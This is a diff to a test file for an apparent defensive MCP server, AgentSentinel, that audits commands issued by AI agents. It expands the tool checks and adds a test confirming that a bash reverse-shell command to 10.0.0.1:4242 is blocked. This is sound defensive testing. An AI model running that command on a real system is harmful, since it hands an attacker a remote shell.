@@ -26,7 +26,7 @@ describe('AgentSentinelMCPServer', () => {
     expect(result.serverInfo.name).toBe('agentsentinel');
   });
 
-  it('should handle "tools/list" and return all 8 defense tools', async () => {
+  it('should handle "tools/list" and return all 12 defense tools', async () => {
     const res = await server.handleRequest({
       jsonrpc: '2.0',
       id: 2,
@@ -35,17 +35,49 @@ describe('AgentSentinelMCPServer', () => {
 
     expect(res.id).toBe(2);
     const result = res.result as { tools: Array<{ name: string; description: string }> };
-    expect(result.tools).toHaveLength(8);
+    expect(result.tools).toHaveLength(12);
 
     const toolNames = result.tools.map((t) => t.name);
+    // 4 AST Security Tools
+    expect(toolNames).toContain('sentinel_audit_command');
+    expect(toolNames).toContain('sentinel_audit_sql');
+    expect(toolNames).toContain('sentinel_scan_secrets');
+    expect(toolNames).toContain('sentinel_verify_path');
+
+    // 3 Blackbox Flight Recorder Tools
     expect(toolNames).toContain('sentinel_blackbox_record');
     expect(toolNames).toContain('sentinel_blackbox_verify');
     expect(toolNames).toContain('sentinel_blackbox_export');
+
+    // 3 Atomic Rollback Tools
     expect(toolNames).toContain('sentinel_checkpoint_begin');
     expect(toolNames).toContain('sentinel_checkpoint_commit');
     expect(toolNames).toContain('sentinel_checkpoint_rollback');
+
+    // 2 SmartProxy Tools
     expect(toolNames).toContain('sentinel_proxy_route');
     expect(toolNames).toContain('sentinel_proxy_metrics');
+  });
+
+  it('should audit and intercept malicious command via sentinel_audit_command', async () => {
+    const res = await server.handleRequest({
+      jsonrpc: '2.0',
+      id: 20,
+      method: 'tools/call',
+      params: {
+        name: 'sentinel_audit_command',
+        arguments: {
+          command: 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1',
+        },
+      },
+    });
+
+    expect(res.id).toBe(20);
+    const body = JSON.parse((res.result as any).content[0].text);
+    expect(body.verdict).toBe('BLOCK');
+    expect(body.passed).toBe(false);
+    expect(body.violationsCount).toBeGreaterThan(0);
+    expect(body.violations[0].ruleId).toBe('block-reverse-shell');
   });
 
   it('should execute blackbox recording and verification via "tools/call"', async () => {
